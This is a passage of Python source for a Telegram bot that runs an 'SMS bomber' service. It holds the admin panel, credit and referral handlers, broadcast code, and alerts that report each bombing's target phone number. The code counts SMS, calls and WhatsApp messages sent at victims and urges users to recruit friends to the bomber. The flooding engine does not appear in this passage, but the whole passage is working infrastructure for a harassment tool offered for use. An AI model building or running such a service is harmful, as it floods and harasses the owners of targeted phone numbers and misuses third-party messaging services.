        f"📞 *CONTACT ADMIN*\n\n"
        f"*Admin:* {OWNER_USERNAME}\n\n"
        f"*Reasons to contact:*\n"
        f"• Report bugs/issues\n"
        f"• Request more credits\n"
        f"• Partnership inquiries\n"
        f"• General questions\n\n"
        f"*Response Time:*\n"
        f"• Usually within 24 hours\n"
        f"• Please be patient\n\n"
        f"*Note:* Don't spam the admin!"
    )
    
    bot.send_message(call.message.chat.id, message, parse_mode='Markdown')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
def handle_admin_panel(call):
    """Show admin panel"""
    user_id = call.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
        InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    )
    keyboard.add(
        InlineKeyboardButton("➕ Add Credits", callback_data="admin_add_credits"),
        InlineKeyboardButton("➖ Remove Credits", callback_data="admin_remove_credits")
    )
    keyboard.add(
        InlineKeyboardButton("👥 Users", callback_data="admin_users"),
        InlineKeyboardButton("📈 Referrals", callback_data="admin_referrals")
    )
    keyboard.add(InlineKeyboardButton("◀️ Back", callback_data="back_to_menu"))
    
    bot.send_message(
        call.message.chat.id,
        "👑 *ADMIN PANEL*\n\n"
        "Select an option below:",
        parse_mode='Markdown',
        reply_markup=keyboard
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_stats")
def handle_admin_stats(call):
    """Show admin statistics"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        
        # Total users
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        
        # Active users today
        cursor.execute('SELECT COUNT(*) FROM users WHERE DATE(join_date) = DATE("now")')
        new_today = cursor.fetchone()[0]
        
        # Total bombs
        cursor.execute('SELECT COUNT(*) FROM bombs')
        total_bombs = cursor.fetchone()[0]
        
        # Active bombs
        cursor.execute('SELECT COUNT(*) FROM bombs WHERE is_active = 1')
        active_bombs = cursor.fetchone()[0]
        
        # Total credits given
        cursor.execute('SELECT SUM(credits) FROM users')
        total_credits = cursor.fetchone()[0] or 0
        
        # Total attacks
        cursor.execute('SELECT SUM(sms_sent + calls_made + whatsapp_sent) FROM bombs')
        total_attacks = cursor.fetchone()[0] or 0
    
    message = (
        f"📊 *ADMIN STATISTICS*\n\n"
        f"👥 Total Users: *{total_users}*\n"
        f"🆕 New Today: *{new_today}*\n"
        f"💣 Total Bombs: *{total_bombs}*\n"
        f"⚡ Active Bombs: *{active_bombs}*\n"
        f"🎯 Total Attacks: *{total_attacks:,}*\n"
        f"💎 Total Credits: *{total_credits}*\n"
        f"🤖 Bot: @{bot.get_me().username}\n"
        f"📢 Channel: {CHANNEL_ID}"
    )
    
    bot.send_message(call.message.chat.id, message, parse_mode='Markdown')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
def handle_admin_broadcast(call):
    """Start broadcast process"""
    user_id = call.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    
    msg = bot.send_message(
        call.message.chat.id,
        "📢 *SEND BROADCAST MESSAGE*\n\n"
        "Send the message you want to broadcast to all users.\n"
        "You can use Markdown formatting.\n\n"
        "Type /cancel to abort",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_broadcast)

def process_broadcast(message):
    """Process broadcast message"""
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ Broadcast cancelled.")
        return
    
    # Get all users
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users')
        users = cursor.fetchall()
    
    total = len(users)
    successful = 0
    failed = 0
    
    bot.send_message(message.chat.id, f"📤 Broadcasting to {total} users...")
    
    for user_tuple in users:
        user_id = user_tuple[0]
        try:
            bot.copy_message(user_id, message.chat.id, message.message_id)
            successful += 1
        except:
            failed += 1
        time.sleep(0.05)  # Rate limit
    
    bot.send_message(
        message.chat.id,
        f"✅ *BROADCAST COMPLETE*\n\n"
        f"📤 Sent to: *{successful}* users\n"
        f"❌ Failed: *{failed}* users\n"
        f"📊 Success Rate: *{(successful/total*100):.1f}%*",
        parse_mode='Markdown'
    )

@bot.callback_query_handler(func=lambda call: call.data == "admin_add_credits")
def handle_admin_add_credits(call):
    """Add credits to user"""
    user_id = call.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    
    msg = bot.send_message(
        call.message.chat.id,
        "➕ *ADD CREDITS*\n\n"
        "Send user ID and amount separated by space:\n"
        "`user_id amount`\n\n"
        "Example: `123456789 5`\n"
        "Type /cancel to abort",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_add_credits)

def process_add_credits(message):
    """Process adding credits"""
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ Operation cancelled.")
        return
    
    try:
        user_id, amount = message.text.split()
        user_id = int(user_id)
        amount = int(amount)
        
        update_user_credits(user_id, amount)
        
        # Notify user
        try:
            bot.send_message(
                user_id,
                f"🎉 *CREDITS ADDED!*\n\n"
                f"Admin added *{amount} credits* to your account.\n"
                f"Total credits now: *{get_user(user_id)[4]}*",
                parse_mode='Markdown'
            )
        except:
            pass
        
        bot.send_message(
            message.chat.id,
            f"✅ Added *{amount} credits* to user `{user_id}`",
            parse_mode='Markdown'
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_remove_credits")
def handle_admin_remove_credits(call):
    """Remove credits from user"""
    user_id = call.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    
    msg = bot.send_message(
        call.message.chat.id,
        "➖ *REMOVE CREDITS*\n\n"
        "Send user ID and amount separated by space:\n"
        "`user_id amount`\n\n"
        "Example: `123456789 2`\n"
        "Type /cancel to abort",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_remove_credits)

def process_remove_credits(message):
    """Process removing credits"""
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ Operation cancelled.")
        return
    
    try:
        user_id, amount = message.text.split()
        user_id = int(user_id)
        amount = int(amount)
        
        update_user_credits(user_id, -amount)
        
        # Notify user
        try:
            bot.send_message(
                user_id,
                f"⚠️ *CREDITS REMOVED*\n\n"
                f"Admin removed *{amount} credits* from your account.\n"
                f"Total credits now: *{get_user(user_id)[4]}*",
                parse_mode='Markdown'
            )
        except:
            pass
        
        bot.send_message(
            message.chat.id,
            f"✅ Removed *{amount} credits* from user `{user_id}`",
            parse_mode='Markdown'
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_users")
def handle_admin_users(call):
    """Show all users"""
    user_id = call.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    
    users = get_all_users()
    
    if not users:
        bot.send_message(call.message.chat.id, "❌ No users found!")
        return
    
    message = "👥 *ALL USERS*\n\n"
    for i, (uid, username, first_name, credits) in enumerate(users[:50], 1):
        username_display = f"@{username}" if username else "No username"
        message += f"{i}. {first_name} ({username_display})\n"
        message += f"   ID: `{uid}` | Credits: {credits}\n\n"
    
    if len(users) > 50:
        message += f"... and {len(users) - 50} more users"
    
    bot.send_message(call.message.chat.id, message, parse_mode='Markdown')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_referrals")
def handle_admin_referrals(call):
    """Show referrals stats"""
    user_id = call.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Access denied!")
        return
    
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        
        # Total referrals
        cursor.execute('SELECT COUNT(*) FROM referrals')
        total_refs = cursor.fetchone()[0]
        
        # Claimed referrals
        cursor.execute('SELECT COUNT(*) FROM referrals WHERE credit_claimed = 1')
        claimed_refs = cursor.fetchone()[0]
        
        # Pending referrals
        cursor.execute('SELECT COUNT(*) FROM referrals WHERE credit_claimed = 0')
        pending_refs = cursor.fetchone()[0]
        
        # Top referrers
        cursor.execute('''
            SELECT referrer_id, COUNT(*) as count 
            FROM referrals 
            GROUP BY referrer_id 
            ORDER BY count DESC 
            LIMIT 10
        ''')
        top_referrers = cursor.fetchall()
    
    message = (
        f"📈 *REFERRAL STATISTICS*\n\n"
        f"📊 Total Referrals: *{total_refs}*\n"
        f"✅ Claimed: *{claimed_refs}*\n"
        f"⏳ Pending: *{pending_refs}*\n\n"
        f"🏆 *TOP 10 REFERRERS:*\n"
    )
    
    for i, (ref_id, count) in enumerate(top_referrers, 1):
        user_info = get_user(ref_id)
        username = user_info[1] if user_info else "Unknown"
        first_name = user_info[2] if user_info else "Unknown"
        message += f"{i}. {first_name} (@{username})\n"
        message += f"   ID: `{ref_id}` | Referrals: {count}\n\n"
    
    bot.send_message(call.message.chat.id, message, parse_mode='Markdown')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
def handle_back_to_menu(call):
    """Go back to main menu"""
    show_main_menu(call.message)
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['profile'])
def command_profile(message):
    """Handle /profile command"""
    handle_profile(types.CallbackQuery(id="1", from_user=message.from_user, message=message, data="profile"))

@bot.message_handler(commands=['refer'])
def command_refer(message):
    """Handle /refer command"""
    user_id = message.from_user.id
    ref_link = get_referral_link(user_id)
    
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={ref_link}&text=Join%20this%20awesome%20SMS%20bomber%20bot!"))
    
    bot.send_message(
        message.chat.id,
        f"📈 *YOUR REFERRAL LINK*\n\n"
        f"🔗 `{ref_link}`\n\n"
        f"*How it works:*\n"
        f"• Share your link with friends\n"
        f"• When they join using your link\n"
        f"• You get *1 credit* automatically\n"
        f"• They get 2 starting credits\n\n"
        f"*Note:* Check /profile for your referral stats",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

@bot.message_handler(commands=['credits'])
def command_credits(message):
    """Handle /credits command"""
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if user:
        bot.send_message(
            message.chat.id,
            f"💎 *YOUR CREDITS*\n\n"
            f"Available: *{user[4]}*\n"
            f"Each bomb (2 hours): *1 credit*\n\n"
            f"*Credit System:*\n"
            f"• Credit deducted when bombing starts\n"
            f"• Even if stopped early\n"
            f"• Get more via /refer\n\n"
            f"*Note:* Admin can modify credits",
            parse_mode='Markdown'
        )
    else:
        bot.send_message(message.chat.id, "❌ User not found! Use /start first.")

@bot.message_handler(commands=['help'])
def command_help(message):
    """Handle /help command"""
    handle_help(types.CallbackQuery(id="1", from_user=message.from_user, message=message, data="help"))

@bot.message_handler(commands=['admin'])
def command_admin(message):
    """Handle /admin command"""
    handle_admin_panel(types.CallbackQuery(id="1", from_user=message.from_user, message=message, data="admin_panel"))

# ==================== NOTIFICATION CHECKER ====================
def check_admin_notifications():
    """Check for pending admin notifications"""
    while True:
        try:
            notifications = get_pending_admin_notifications()
            for notification in notifications:
                notification_id, user_id, target_number, start_time, notified = notification
                
                user_info = get_user(user_id)
                if user_info:
                    username = user_info[1] or "Unknown"
                    first_name = user_info[2] or "Unknown"
                    
                    for admin_id in ADMIN_IDS:
                        try:
                            bot.send_message(
                                admin_id,
                                f"🚨 *BOMBING ALERT*\n\n"
                                f"👤 User: {first_name} (@{username})\n"
                                f"🆔 ID: `{user_id}`\n"
                                f"🎯 Target: `{target_number}`\n"
                                f"⏰ Started: {start_time}",
                                parse_mode='Markdown'
                            )
                        except:
                            pass
                
                mark_notification_sent(notification_id)
        
        except:
            pass
        
        time.sleep(60)  # Check every minute

# ==================== REFERRAL CREDIT CHECKER ====================
def check_pending_referrals():
    """Check and claim pending referrals"""
    while True:
        try:
            with sqlite3.connect(DB_NAME) as conn:
                cursor = conn.cursor()
                
                # Get pending referrals where referred user is approved
                cursor.execute('''
                    SELECT r.referrer_id, r.referred_id 
                    FROM referrals r
                    JOIN users u ON r.referred_id = u.user_id
                    WHERE r.credit_claimed = 0 
                    AND u.is_approved = 1
                    LIMIT 10
                ''')
                pending_refs = cursor.fetchall()
                
                for referrer_id, referred_id in pending_refs:
                    # Claim credit
                    claim_referral_credit(referrer_id, referred_id)
                    
                    # Notify referrer
                    try:
                        referred_user = get_user(referred_id)
                        referred_name = referred_user[2] if referred_user else "Unknown"
                        
                        bot.send_message(
                            referrer_id,
                            f"🎉 *REFERRAL CREDIT EARNED!*\n\n"
                            f"User *{referred_name}* joined using your link!\n"
                            f"You received *1 credit*!\n"
                            f"Total credits now: *{get_user(referrer_id)[4]}*",
                            parse_mode='Markdown'
                        )
                    except:
                        pass
        
        except:
            pass
        
        time.sleep(30)  # Check every 30 seconds

# ==================== MAIN FUNCTION ====================
if __name__ == "__main__":
    # Initialize database
    init_db()
    
    # Set admin credits to 9999
    for admin_id in ADMIN_IDS:
        create_user(admin_id, "admin", "Admin")
        update_user_credits(admin_id, 9999 - 2)  # Start with 2, add 9997
    
    # Start background threads
    threading.Thread(target=check_admin_notifications, daemon=True).start()
    threading.Thread(target=check_pending_referrals, daemon=True).start()
    
    print("🤖 Bot starting...")
    print(f"📊 Total APIs: {TOTAL_APIS}")
    print(f"📱 SMS APIs: {len(SMS_APIS)}")
    print(f"📞 Voice APIs: {len(VOICE_APIS)}")
    print(f"💬 WhatsApp APIs: {len(WHATSAPP_APIS)}")
    print(f"⚡ Bot username: @{bot.get_me().username}")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"📢 Channel: {CHANNEL_ID}")
    
    # Start bot
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Bot error: {e}")
        time.sleep(5)
